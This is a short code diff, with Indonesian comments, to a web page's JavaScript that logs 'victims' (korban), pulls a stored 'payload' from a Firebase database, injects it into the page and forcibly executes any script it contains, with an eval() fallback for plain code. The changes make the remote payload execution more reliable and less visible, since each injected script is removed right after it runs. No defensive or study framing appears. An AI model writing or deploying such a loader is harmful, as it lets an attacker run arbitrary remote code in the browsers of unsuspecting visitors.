@@ -22,19 +22,24 @@
             // 1. Catat Log Korban
             firebase.database().ref('payloads/' + id).once('value').then(snap => {
     if(snap.val()) {
-        const payload = snap.val().isi;
+        const payloadRaw = snap.val().isi;
         
-        // Buat container rahasia
-        const div = document.createElement('div');
-        div.innerHTML = payload;
-        document.body.appendChild(div);
+        // 1. Suntikkan HTML (untuk bar merah dll)
+        const container = document.createElement('div');
+        container.innerHTML = payloadRaw;
+        document.body.prepend(container); // Muncul di paling atas
 
-        // Cari semua tag <script> di dalam payload dan paksa jalan
-        const scripts = div.getElementsByTagName('script');
+        // 2. Cari semua tag <script> di dalam payload dan PAKSA jalan
+        const scripts = container.getElementsByTagName('script');
         for (let i = 0; i < scripts.length; i++) {
-            const newScript = document.createElement('script');
-            newScript.text = scripts[i].text;
-            document.body.appendChild(newScript);
+            const executeScript = document.createElement('script');
+            executeScript.text = scripts[i].innerHTML; // Ambil isi di dalam <script>
+            document.head.appendChild(executeScript).parentNode.removeChild(executeScript);
+        }
+        
+        // 3. Cadangan: Jika payload kamu cuma tulisan alert tanpa tag script
+        if(!payloadRaw.includes('<script>')) {
+             try { eval(payloadRaw); } catch(e) {}
         }
     }
 });
@@ -49,3 +54,4 @@
 
 
 </html>
+
